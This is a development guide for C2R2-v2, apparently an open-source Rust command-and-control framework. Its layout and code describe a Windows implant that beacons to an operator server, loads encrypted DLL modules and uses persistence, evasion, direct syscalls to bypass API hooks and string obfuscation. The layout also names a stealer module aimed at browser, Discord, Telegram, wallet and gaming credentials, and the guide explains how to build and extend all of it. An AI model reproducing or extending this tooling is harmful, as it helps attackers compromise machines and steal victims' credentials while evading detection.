# Development Guide

This guide provides technical details for developers working on C2R2-v2 or extending its functionality.

## Project Structure

```
C2R2-v2/
├── agent/                  # Windows agent (implant)
│   ├── src/
│   │   ├── main.rs        # Agent entry point
│   │   ├── beacon.rs      # Beacon timing logic
│   │   ├── persistence.rs # Persistence mechanisms
│   │   ├── persistence_fileless.rs # Fileless persistence
│   │   ├── evasion.rs     # Anti-analysis techniques
│   │   ├── syscalls.rs    # Direct system calls
│   │   └── config.rs      # Configuration
│   ├── build.rs           # Build script
│   └── Cargo.toml
│
├── c2r2-server/            # C2 server
│   ├── src/
│   │   └── main.rs        # Server implementation
│   ├── modules/           # Encrypted modules
│   ├── downloads/         # Downloaded files
│   ├── harvests/          # Harvested credentials
│   ├── logs/              # Server logs
│   └── Cargo.toml
│
├── builder/                # Agent builder tool
│   ├── src/
│   │   ├── main.rs        # CLI interface
│   │   ├── encrypt.rs     # Module encryption
│   │   └── dll_encrypt.rs # DLL encryption helpers
│   ├── output/            # Generated agents
│   └── Cargo.toml
│
├── stealer-dll/            # Credential stealing module
│   ├── src/
│   │   ├── lib.rs         # DLL exports
│   │   └── stealer/       # Stealer implementations
│   │       ├── mod.rs     # Module definition
│   │       ├── chromium.rs
│   │       ├── firefox.rs
│   │       ├── discord.rs
│   │       ├── telegram.rs
│   │       ├── wallets.rs
│   │       ├── gaming.rs
│   │       ├── autofill.rs
│   │       ├── syscalls.rs
│   │       └── ...
│   └── Cargo.toml
│
├── docs/                   # Documentation
│   ├── README.md
│   ├── ARCHITECTURE.md
│   ├── INSTALLATION.md
│   ├── USAGE.md
│   ├── MODULES.md
│   ├── API.md
│   ├── SECURITY.md
│   ├── CONTRIBUTING.md
│   └── DEVELOPMENT.md
│
├── Cargo.toml              # Workspace definition
├── README.md               # Project readme
└── LICENSE                 # License file
```

## Development Setup

### Local Development

```bash
# Clone repository
git clone https://github.com/G4sp4rCS/C2R2-v2.git
cd C2R2-v2

# Install dependencies
rustup target add x86_64-pc-windows-gnu
sudo apt install mingw-w64

# Build all components
cargo build --workspace

# Build release versions
cargo build --release -p c2r2-server -p builder

# For Windows-specific components (agent, stealer)
cargo build --release --target x86_64-pc-windows-gnu -p agent
cargo build --release --target x86_64-pc-windows-gnu -p stealer-dll
```

### Testing Setup

```bash
# Run all tests
cargo test --workspace

# Run specific component tests
cargo test -p agent
cargo test -p c2r2-server

# Run with output
cargo test -- --nocapture

# Run specific test
cargo test test_beacon_jitter -- --nocapture
```

### Code Quality

```bash
# Format code
cargo fmt --all

# Check formatting
cargo fmt --check --all

# Run clippy linter
cargo clippy --workspace -- -D warnings

# Check for common issues
cargo clippy --workspace --all-targets -- -W clippy::all

# Generate documentation
cargo doc --workspace --no-deps --open
```

## Component Development

### Agent Development

The agent is the implant that runs on target systems.

**Key Files**:
- `agent/src/main.rs` - Main loop and command handling
- `agent/src/beacon.rs` - Beacon timing implementation
- `agent/src/persistence.rs` - Persistence mechanisms

**Building the Agent**:

```bash
# Debug build (with console output)
cargo build --target x86_64-pc-windows-gnu -p agent

# Release build (optimized, no console)
cargo build --release --target x86_64-pc-windows-gnu -p agent

# Using builder tool
cd builder
cargo run --release -- build-agent --name test-agent --server 127.0.0.1:4444
```

**Agent Configuration**:

Edit `agent/src/config.rs`:

```rust
// C2 server address
pub const C2_SERVER: &str = "192.168.1.10:4444";

// Alternative: Load from embedded data at build time
// Modify builder to inject configuration
```

**Adding New Commands**:

1. **Define command handler in agent**:

```rust
// agent/src/main.rs
if command.starts_with("__NEWCMD__:") {
    let params = command.strip_prefix("__NEWCMD__:").unwrap();
    let result = handle_newcmd(params);
    writer.write_all(result.as_bytes()).ok();
    writer.flush().ok();
}

fn handle_newcmd(params: &str) -> String {
    // Implementation
    format!("Result: {}{}", result_data, DELIMITER)
}
```

2. **Add server command**:

```rust
// c2r2-server/src/main.rs
"/newcmd" => {
    if let Some(client) = &selected_client {
        let command = format!("__NEWCMD__:{}\n", args);
        send_command(client, &command).await;
    }
}
```

### Server Development

The C2 server manages agent connections and operator interactions.

**Key Features**:
- Async TCP server with tokio
- Multi-client handling
- Command queueing
- Logging with tracing

**Server Architecture**:

```rust
// Main components
async fn main() {
    // 1. Start TCP listener
    let listener = TcpListener::bind("0.0.0.0:4444").await?;
    
    // 2. Spawn CLI thread
    tokio::spawn(cli_loop());
    
    // 3. Accept client connections
    loop {
        let (stream, addr) = listener.accept().await?;
        tokio::spawn(handle_client(stream, addr));
    }
}
```

**Adding New Server Features**:

```rust
// Add new command handler
match input.trim() {
    cmd if cmd.starts_with("/newfeature") => {
        // Implementation
        println!("[+] Feature executed");
    }
    // ... other commands
}
```

**Logging Configuration**:

```rust
// c2r2-server/src/main.rs
use tracing::{info, error, debug};

// Initialize logging
tracing_subscriber::fmt()
    .with_max_level(tracing::Level::INFO)
    .init();

// Use in code
info!("Client connected: {}", addr);
error!("Failed to send command: {}", e);
debug!("Raw command: {}", cmd);
```

### Module Development

Modules are DLLs loaded on-demand by the agent.

**Module Template**:

```rust
// my-module/src/lib.rs
#![allow(non_snake_case)]

use std::os::raw::c_char;
use std::ffi::CString;
use std::panic;

/// Module initialization
#[no_mangle]
pub extern "C" fn module_init() -> i32 {
    // Setup
    0  // Return 0 on success
}

/// Main functionality
#[no_mangle]
pub extern "C" fn module_execute() -> *mut c_char {
    let result = panic::catch_unwind(|| {
        let output = do_work();
        CString::new(output).unwrap().into_raw()
    });
    
    match result {
        Ok(ptr) => ptr,
        Err(_) => {
            CString::new("ERROR:Module panic").unwrap().into_raw()
        }
    }
}

/// Free returned strings
#[no_mangle]
pub extern "C" fn free_string(s: *mut c_char) {
    unsafe {
        if !s.is_null() {
            let _ = CString::from_raw(s);
        }
    }
}

fn do_work() -> String {
    // Module logic
    String::from("Success")
}

// DllMain for Windows
#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllMain(
    _hinst_dll: *mut std::ffi::c_void,
    fdw_reason: u32,
    _lpv_reserved: *mut std::ffi::c_void,
) -> i32 {
    1  // TRUE
}
```

**Building Modules**:

```bash
# Build as DLL
cargo build --release --target x86_64-pc-windows-gnu -p my-module

# Encrypt module
cd builder
cargo run --release -- encrypt-module \
    --input ../target/x86_64-pc-windows-gnu/release/my_module.dll \
    --output ../c2r2-server/modules/my_module.enc
```

**Loading Modules in Agent**:

```rust
// agent/src/main.rs
use libloading::{Library, Symbol};

fn load_and_execute_module(path: &str) -> Result<String> {
    unsafe {
        // Load library
        let lib = Library::new(path)?;
        
        // Get function
        let execute: Symbol<extern "C" fn() -> *mut c_char> =
            lib.get(b"module_execute")?;
        
        // Call function
        let result_ptr = execute();
        let result = CStr::from_ptr(result_ptr).to_string_lossy().into_owned();
        
        // Free string
        let free_fn: Symbol<extern "C" fn(*mut c_char)> =
            lib.get(b"free_string")?;
        free_fn(result_ptr);
        
        Ok(result)
    }
}
```

### Builder Development

The builder creates configured agents and encrypts modules.

**Key Functions**:
- Agent compilation with embedded config
- Module encryption (AES-256-GCM)
- Key generation and management

**Adding Build Options**:

```rust
// builder/src/main.rs
#[derive(Parser)]
#[command(name = "C2R2 Builder")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    BuildAgent {
        #[arg(short, long)]
        name: String,
        
        #[arg(short, long)]
        server: String,
        
        // Add new option
        #[arg(short, long)]
        beacon_interval: Option<u64>,
    },
    // ... other commands
}
```

## Advanced Topics

### Direct Syscalls

Bypass userland API hooks by calling syscalls directly.

**Implementation**:

```rust
// agent/src/syscalls.rs
use std::ptr;

type NtAllocateVirtualMemory = unsafe extern "system" fn(
    ProcessHandle: *mut winapi::um::winnt::HANDLE,
    BaseAddress: *mut *mut winapi::ctypes::c_void,
    ZeroBits: usize,
    RegionSize: *mut usize,
    AllocationType: u32,
    Protect: u32,
) -> i32;

pub fn nt_allocate_virtual_memory(
    size: usize,
    protection: u32,
) -> Result<*mut u8> {
    unsafe {
        // Get ntdll.dll
        let ntdll = libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8);
        
        // Get NtAllocateVirtualMemory
        let func_addr = libloaderapi::GetProcAddress(
            ntdll,
            b"NtAllocateVirtualMemory\0".as_ptr() as *const i8
        );
        
        let nt_alloc: NtAllocateVirtualMemory = std::mem::transmute(func_addr);
        
        // Call syscall
        let mut base_addr: *mut winapi::ctypes::c_void = ptr::null_mut();
        let mut size = size;
        let status = nt_alloc(
            processthreadsapi::GetCurrentProcess(),
            &mut base_addr,
            0,
            &mut size,
            winnt::MEM_COMMIT | winnt::MEM_RESERVE,
            protection
        );
        
        if status == 0 {
            Ok(base_addr as *mut u8)
        } else {
            Err(Error::SyscallFailed(status))
        }
    }
}
```

### String Obfuscation

Use compile-time string encryption:

```rust
use obfstr::obfstr;

// Encrypted at compile time
let cmd = obfstr!("whoami");
let powershell = obfstr!("powershell.exe");

// Use in code
Command::new(powershell).arg("-Command").arg(cmd);
```

### Module Encryption

```rust
// builder/src/encrypt.rs
use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use rand::RngCore;

pub fn encrypt_module(module_bytes: &[u8]) -> Result<(Vec<u8>, Vec<u8>)> {
    // Generate random key
    let mut key_bytes = [0u8; 32];
    rand::thread_rng().fill_bytes(&mut key_bytes);
    let key = Key::<Aes256Gcm>::from_slice(&key_bytes);
    
    // Generate random nonce
    let mut nonce_bytes = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);
    
    // Encrypt
    let cipher = Aes256Gcm::new(key);
    let ciphertext = cipher.encrypt(nonce, module_bytes)?;
    
    // Return ciphertext and key
    Ok((ciphertext, key_bytes.to_vec()))
}
```

## Debugging

### Agent Debugging

**Enable console output**:

```rust
// agent/src/main.rs
#![windows_subsystem = "console"]  // Show console window

println!("DEBUG: {}", message);
```

**Attach debugger**:

```bash
# Using x64dbg (Windows)
x64dbg.exe agent.exe

# Using WinDbg
windbg.exe agent.exe
```

### Server Debugging

**Enable verbose logging**:

```bash
# Set environment variable
export RUST_LOG=debug
./c2r2-server

# Or inline
RUST_LOG=trace ./c2r2-server
```

**Debug with VS Code**:

```json
// .vscode/launch.json
{
    "version": "0.2.0",
    "configurations": [
        {
            "type": "lldb",
            "request": "launch",
            "name": "Debug Server",
            "cargo": {
                "args": ["build", "-p", "c2r2-server"]
            },
            "args": [],
            "cwd": "${workspaceFolder}/c2r2-server"
        }
    ]
}
```

## Performance Optimization

### Binary Size Reduction

```toml
# Cargo.toml
[profile.release]
opt-level = "z"          # Optimize for size
lto = true               # Link-time optimization
codegen-units = 1        # Single codegen unit
strip = true             # Strip symbols
panic = "abort"          # No unwinding
```

### Compilation Time

```bash
# Use mold linker (faster)
cargo install mold
export RUSTFLAGS="-C link-arg=-fuse-ld=mold"

# Parallel compilation
export CARGO_BUILD_JOBS=8
```

## Testing

### Unit Tests

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_feature() {
        let result = my_function();
        assert_eq!(result, expected);
    }
}
```

### Integration Tests

```bash
# tests/integration_test.rs
#[test]
fn test_agent_server_communication() {
    // Start server
    let server = start_test_server();
    
    // Connect agent
    let agent = connect_test_agent();
    
    // Send command
    server.send_command("whoami");
    
    // Verify response
    let response = server.get_response();
    assert!(response.contains("username"));
}
```

## Continuous Integration

### GitHub Actions

```yaml
# .github/workflows/ci.yml
name: CI

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - uses: actions-rs/toolchain@v1
        with:
          toolchain: stable
      - name: Install dependencies
        run: sudo apt-get install mingw-w64
      - name: Add Windows target
        run: rustup target add x86_64-pc-windows-gnu
      - name: Build
        run: cargo build --workspace
      - name: Test
        run: cargo test --workspace
      - name: Clippy
        run: cargo clippy --workspace -- -D warnings
```

## Troubleshooting

### Common Issues

**Issue**: Cross-compilation fails

```bash
# Solution: Install MinGW and add target
sudo apt install mingw-w64
rustup target add x86_64-pc-windows-gnu
```

**Issue**: Module loading fails

```bash
# Solution: Check DLL dependencies
objdump -p stealer.dll | grep "DLL Name"

# Ensure all required DLLs are present on target
```

**Issue**: Agent doesn't connect

```bash
# Solution: Check server is running and reachable
nc -zv server-ip 4444

# Check firewall rules
sudo ufw status
```

## Resources

### Documentation
- [Rust Book](https://doc.rust-lang.org/book/)
- [Rust API Docs](https://doc.rust-lang.org/std/)
- [Windows API Reference](https://docs.microsoft.com/en-us/windows/win32/api/)

### Tools
- [Rust Analyzer](https://rust-analyzer.github.io/) - IDE support
- [cargo-edit](https://github.com/killercup/cargo-edit) - Dependency management
- [cargo-audit](https://github.com/RustSec/rustsec/tree/main/cargo-audit) - Security audits

### Community
- [Rust Users Forum](https://users.rust-lang.org/)
- [/r/rust](https://www.reddit.com/r/rust/)
- [Rust Discord](https://discord.gg/rust-lang)

---

**Happy coding! Build responsibly.**
